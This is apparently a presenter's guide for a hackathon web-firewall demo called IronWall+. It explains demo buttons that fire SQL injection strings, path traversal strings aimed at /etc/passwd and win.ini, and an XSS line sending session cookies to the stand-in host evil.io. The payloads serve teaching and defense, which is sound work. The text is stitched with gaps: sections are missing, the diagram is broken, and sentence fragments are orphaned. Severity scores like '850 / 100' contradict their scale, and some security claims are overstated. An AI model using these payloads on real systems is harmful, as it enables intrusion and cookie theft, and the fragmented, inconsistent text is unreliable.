==============================================================================
  1. WHAT IS IRONWALL+?
==============================================================================

IronWall+ is a real-time, interactive Web Application Firewall (WAF)
demonstration built for the Gamethon 2026 hackathon. It is NOT a toy
simulation -- the attack-to-defense communication is driven by a real
Rust-powered backend server running the Cloudflare Pingora framework, and
real WebSocket connections are used to send, receive, and display live attack
telemetry.

WHAT PROBLEM DOES IT SOLVE?
Traditional security demos are boring slides. IronWall+ makes cybersecurity
visceral and interactive. Any person in the audience can take out their phone,
navigate to the attacker panel, and fire a real SQL Injection payload at the
defense core -- and they can watch it get blocked in real time on the
projector screen.

KEY DESIGN PILLARS:
  - Real Backend    : Rust + Pingora WAF, not just a UI mock
  - Real WebSockets : Attacks travel over a live WS connection
  - Educational     : Each attack comes with an explanation, a payload view,
                      and a code fix comparison
  - Interactive     : Mobile-first attacker panel that any guest can use
  - Cinematic       : WebGL glitch shaders, screen shake, CyberSynth audio,
                      and Text-to-Speech voice

  |  ATTACKER PANEL   | ----------------------------------------->  +----------------------+
  |  attacker.html    |                                              |                      |
  |  attacker.js      |                                              |  RUST BACKEND SERVER |

  |  game.js          |

Both panels connect to the SAME WebSocket server.
  - Attacker fires an attack  -->  Backend receives the event
  - Backend broadcasts a BLOCKED event  -->  Defense Grid displays it

FILES AND THEIR PURPOSE:
  frontend/index.html   - Defense Grid HTML structure
  frontend/game.js      - Defense Grid logic: canvas, WebSockets, AI debrief, HUD
  frontend/attacker.html- Attacker Control Panel HTML structure

  frontend/demo.html    - Split-screen demo mode layout
  frontend/recorder.js  - Browser screen recording (MediaRecorder API)
  frontend/serve.js     - Node.js static file server (port 3000)
  backend/src/main.rs   - Rust backend: WebSocket relay + WAF detection
  start.bat             - One-click launcher for both servers


==============================================================================
  3. HOW TO START THE SYSTEM
==============================================================================

STEP 1: Run start.bat
  Double-click the start.bat file in the root project folder. This opens
  TWO black terminal windows:
    - Terminal 1: Runs "node serve.js" --> serves the frontend on
                  http://localhost:3000
    - Terminal 2: Runs "cargo run" in the backend folder --> starts the Rust
                  WebSocket server on ws://localhost:9001/ws

  !! IMPORTANT !! Do NOT close either terminal window during your
  presentation. If you close them, the servers stop and attacks will no
  longer reach the defense grid!

STEP 2: Open the URLs in your browser
  http://localhost:3000/             --> Defense Grid (main screen to project)
  http://localhost:3000/attacker.html --> Attacker Control Panel
  http://localhost:3000/demo.html    --> Split-screen demo mode (RECOMMENDED)

MOBILE ACCESS:
  On the same Wi-Fi network, anyone can access the attacker panel from their
  phone. Replace "localhost" with your computer's local IP address.
  Example: http://192.168.1.5:3000/attacker.html

  To find your local IP, open Command Prompt and type: ipconfig
  Look for "IPv4 Address" under your active network adapter.

==============================================================================
  6. ALL ATTACK BUTTONS -- EXPLAINED
==============================================================================

These are the LIVE FIRE buttons that send data to the backend.

----------------------------------------------------------------------
  [1] SQL: TAUTOLOGY
----------------------------------------------------------------------
  Payload : ' OR '1'='1 --
  Attack  : A classic SQL Injection. The single quote (') escapes the
            intended SQL string. "OR '1'='1'" makes the WHERE clause ALWAYS
            TRUE, bypassing login authentication entirely. The "--" comments
            out anything after it in the query.
  Severity: 850 / 100

----------------------------------------------------------------------
  [2] SQL: UNION-BASED
----------------------------------------------------------------------
  Payload : UNION SELECT username, password FROM users --
  Attack  : UNION-based SQLi "stacks" a second SELECT query onto the first.
            The attacker uses this to extract data from a completely different
            database table (such as the users table with plain-text passwords).
  Severity: 900 / 100

----------------------------------------------------------------------
  [3] SQL: BLIND/TIME
----------------------------------------------------------------------
  Payload : ' OR IF(1=1, SLEEP(5), 0) --
  Attack  : In Time-based Blind SQLi, the attacker gets no data back
            directly. Instead, they ask the database true/false questions.
            Example: "Does the admin password start with 'A'?"
            If the site takes 5 extra seconds to respond (SLEEP(5) ran),
            the answer is YES. The attacker slowly extracts the full database
            one character at a time without triggering any alarms.
  Severity: 820 / 100

----------------------------------------------------------------------
  [4] XSS: REFLECTED
----------------------------------------------------------------------
  Payload : <script>document.location='https://evil.io/steal?c='
            +document.cookie</script>
  Attack  : Reflected Cross-Site Scripting. This payload is embedded into a
            crafted URL. If a victim is tricked into clicking that URL, the
            malicious script runs in THEIR browser, steals their session
            cookie, and sends it to the attacker's server. The attacker now
            has the victim's logged-in session.
  Severity: 800 / 100

----------------------------------------------------------------------
  [5] XSS: STORED
----------------------------------------------------------------------
  Payload : <img src=x onerror='alert("XSS Stored")'>
  Attack  : Unlike Reflected XSS (which requires a special link), Stored XSS
            saves the payload ON THE SERVER (e.g., in a comment box database
            field). Every user who visits that page then automatically executes
            the injected script. This acts like a worm, infecting all visitors.
  Severity: 950 / 100

----------------------------------------------------------------------
  [6] PT: LINUX ROOT
----------------------------------------------------------------------
  Payload : ../../../../etc/passwd
  Attack  : Path Traversal / Directory Traversal. The attacker uses the "../"
            sequence to "climb up" directory levels and escape the intended
            web root folder. /etc/passwd contains Linux user account names
            and is the first step toward gaining system access.
  Severity: 750 / 100

----------------------------------------------------------------------
  [7] PT: WINDOWS SYS
----------------------------------------------------------------------
  Payload : ..\..\..\windows\win.ini
  Attack  : Same concept as Linux Path Traversal but targeting Windows
            servers. win.ini is an old Windows configuration file. Reading it
            confirms a successful traversal and reveals system configuration
            details, which can be used for privilege escalation.
  Severity: 750 / 100

----------------------------------------------------------------------
  [8] DDoS: SYN FLOOD
----------------------------------------------------------------------
  Payload : SYN_FLOOD :: 120Gbps
  Attack  : A SYN Flood exploits the TCP 3-way handshake.
            Normal flow: Client sends SYN --> Server replies SYN-ACK -->
            Client replies ACK --> Connection established.
            Attack flow: Attacker sends millions of SYN packets from FAKE IPs
            but never sends the final ACK. The server holds a "half-open"
            connection slot for each one while waiting. The connection table
            fills up completely and legitimate users are denied service.
  Severity: 950 / 100

----------------------------------------------------------------------
  [9] DDoS: UDP AMP
----------------------------------------------------------------------
  Payload : UDP_AMPLIFICATION :: DNS:x173
  Attack  : UDP Amplification uses open DNS or NTP servers as amplifiers.
            The attacker sends a small 50-byte packet to thousands of public
            servers, forging the SOURCE IP to be the victim's IP. Each server
            sends a huge 8,500-byte response to the victim. This achieves a
            173x amplification of the attacker's bandwidth, creating a
            massive flood with minimal resources.
  Severity: 980 / 100

----------------------------------------------------------------------
  [10] ZERO-DAY
----------------------------------------------------------------------
  Payload : Polymorphic XOR shellcode (mutates on each execution)
  Attack  : A zero-day exploit uses a vulnerability that the software vendor
            has not yet discovered or patched. This button simulates a
            POLYMORPHIC exploit, meaning it changes its byte signature on
            every execution to evade antivirus tools that rely on pattern
            matching against known-bad signatures.
  Special : After blocking, triggers the OUROBOROS EVOLUTION ENGINE on the
            defense panel, showing the AI generating a WASM patch to block
            all future variants.
  Severity: 99 / 100

----------------------------------------------------------------------
  [11] MIRROR PROBE
----------------------------------------------------------------------
  Payload : Persistent reconnaissance probe from the same IP
  Attack  : A sophisticated attacker does not just rush in. They probe for
            open ports, vulnerable endpoints, and misconfigured services.
            After multiple probe attempts from the same IP are blocked,
            IronWall+'s Tartarus Engine activates.
  Special : Triggers the MIRROR DIMENSION HONEYPOT on both panels. The
            attacker is silently routed to a fake infrastructure.
  Severity: 60 / 100

----------------------------------------------------------------------
  [12] PHISHING
----------------------------------------------------------------------
  Action  : Opens the Phishing Simulator (a special multi-step modal).
  Attack  : Opens a module where you compose a realistic phishing email by
            choosing a subject line (urgency lure) and a malicious link.
            Then an animated employee "receives" the email, hovers over the
            link, and clicks it. The simulation shows the full infection chain
            -- and then shows IronWall+ detecting the C2 beacon callback and
            severing the connection before credentials are fully stolen.
  Lesson  : No firewall can stop a human from clicking a link. MFA +
            Security Awareness Training are the only true defenses.

TRIGGERED BY: The Mirror Probe button.

persistent attacker is detected (multiple blocks from the same IP), instead
of just blocking them again, IronWall+ silently routes them to an entirely
FAKE infrastructure.

On the ATTACKER panel, a special "MIRROR DIMENSION" popup appears showing a

and gained root access. The fake terminal shows realistic-looking fake data.

  "Tartarus Engine Activated -- Attacker Banished to Mirror Dimension.
   All interactions logged. Intelligence harvest in progress."

KEY LESSON FOR JUDGES:
  Honeypots do not just stop attacks -- they turn attackers into unwitting
  intelligence sources. This is how nation-states and top security teams study
  attacker TTPs (Tactics, Techniques & Procedures) in real-world environments.

==============================================================================
  16. GLOSSARY OF TECHNOLOGY
==============================================================================

RUST
  A modern systems programming language. It is as fast as C/C++ but
  guarantees memory safety at compile time -- meaning it physically cannot
  have memory corruption bugs like buffer overflows or dangling pointers.
  IronWall+ uses Rust for the backend because it gives us C-level performance
  with zero security overhead.

PINGORA
  An open-source, production-grade L7 proxy framework built by Cloudflare,
  written in Rust. It is the same technology that powers Cloudflare's own CDN
  and WAF infrastructure. IronWall+ uses Pingora as the WAF engine that sits
  in front of the server and inspects every incoming HTTP and WebSocket request.

eBPF / XDP (Aegis Prime module)
  Extended Berkeley Packet Filter. A revolutionary Linux kernel technology
  that allows us to run sandboxed programs INSIDE the kernel itself. IronWall+
  uses eBPF/XDP (eXpress Data Path) to drop malicious packets at the very
  network interface card, BEFORE they can touch the OS network stack. This
  achieves sub-microsecond (faster than 1 millionth of a second) blocking.

WEBSOCKET
  A persistent, bidirectional communication protocol that operates over a
  single TCP connection. Unlike standard HTTP (which is always
  request-then-response), a WebSocket lets the SERVER push data to the CLIENT
  at any time without the client asking. This is how the backend instantly
  pushes blocked attack events to the defense grid the moment they happen.

OUROBOROS ENGINE
  IronWall+'s Genetic AI self-evolution subsystem (named after the snake that
  eats its own tail -- a symbol of infinite cycles). When it encounters a new
  zero-day variant, it: (1) Mutates the payload in an isolated sandbox,
  (2) uses the local Phi-3 LLM to analyze the mutation pattern and suggest a
  detection rule, (3) compiles that rule into a WASM module via the Ghost
  Engine, (4) hot-deploys the patch -- all in seconds without a server restart.

TARTARUS ENGINE
  IronWall+'s software-defined deception subsystem (named after the Greek
  mythological underworld where souls are imprisoned). Instead of simply
  blocking a persistent attacker, Tartarus silently redirects them to a fake
  parallel infrastructure -- a honeypot -- serving fake data, fake admin
  panels, and fake credentials, while logging every action they take.

PHI-3 LLM (LOCAL)
  Microsoft Research's highly efficient small language model. Unlike ChatGPT
  which requires cloud connectivity, Phi-3 runs entirely ON-DEVICE with no
  internet connection. IronWall+ uses it to generate natural-language threat
  reports, analyze novel attack patterns, and suggest detection rule code for
  the Ouroboros Engine.

GHOST ENGINE (WASM)
  The WebAssembly patch compiler within IronWall+. When the Ouroboros Engine
  generates a new detection logic, the Ghost Engine compiles it into a tiny
  sandboxed .wasm module. WASM runs at near-native CPU speed but is perfectly
  isolated from the host system. This allows IronWall+ to extend its
  filtering rules in real time without restarting or recompiling.

CHITCHAT P2P (GOSSIP PROTOCOL)
  A peer-to-peer network module. When one IronWall+ node blocks a malicious
  IP, it "gossips" that block decision to its neighboring nodes. Those nodes
  gossip to their neighbors. Within seconds, the entire IronWall+ cluster
  learns about the attacker without any central coordinator or database.
  This makes the blocklist distribution both instant and fault-tolerant.

TPM 2.0 AUDIT CHAIN
  Trusted Platform Module -- a hardware security chip present in modern
  computers. IronWall+ logs every block decision to the TPM as a signed entry
  in a tamper-proof hardware audit chain. This means the forensic record of
  every WAF decision is cryptographically verifiable and cannot be altered
  by anyone -- not even an administrator with root access.

WAF (WEB APPLICATION FIREWALL)
  A security layer that sits in front of a web application and filters
  incoming HTTP/S traffic. Unlike a regular network firewall (which blocks
  based on IP and port), a WAF understands the APPLICATION LAYER -- it can
  read the content of HTTP requests and identify attacks like SQL Injection
  and XSS that look like perfectly valid web requests to a normal firewall.

AST (ABSTRACT SYNTAX TREE)
  How a compiler or interpreter "sees" code structure. IronWall+ does not
  just pattern-match text strings (which is easily bypassed with spaces,
  comments, or encoding tricks). Instead, it parses incoming SQL queries into
  an AST -- a tree structure representing the query's logical meaning. This
  way, it catches "OR/**/'1'/**/'='/**/'1'" just as well as "OR '1'='1'".

ZERO TRUST ARCHITECTURE
  A security philosophy: "Never trust, always verify." No user, device, or
  service is automatically trusted just because it is inside the corporate
  network. Every access request must be re-authenticated, authorized, and
  granted only the minimum privilege needed. This dramatically limits the
  damage an attacker can do even after successfully breaching the perimeter.

SBOM (SOFTWARE BILL OF MATERIALS)
  A formal, machine-readable inventory of every software component in a
  system -- including all 3rd-party libraries, their version numbers, and
  their known vulnerabilities. Critical for Supply Chain attack defense. If a
  malicious library version is published, a company with a proper SBOM can
  immediately identify which of their products are affected.

MFA / 2FA (MULTI-FACTOR AUTHENTICATION)
  Requiring users to prove their identity with two or more independent factors:
    - Something they KNOW:  Password or PIN
    - Something they HAVE:  Phone app (TOTP), hardware key (FIDO2/YubiKey)
    - Something they ARE:   Fingerprint, face scan (biometrics)
  Even if an attacker steals a password via phishing, they cannot log in
  without also having the victim's physical phone or hardware key.
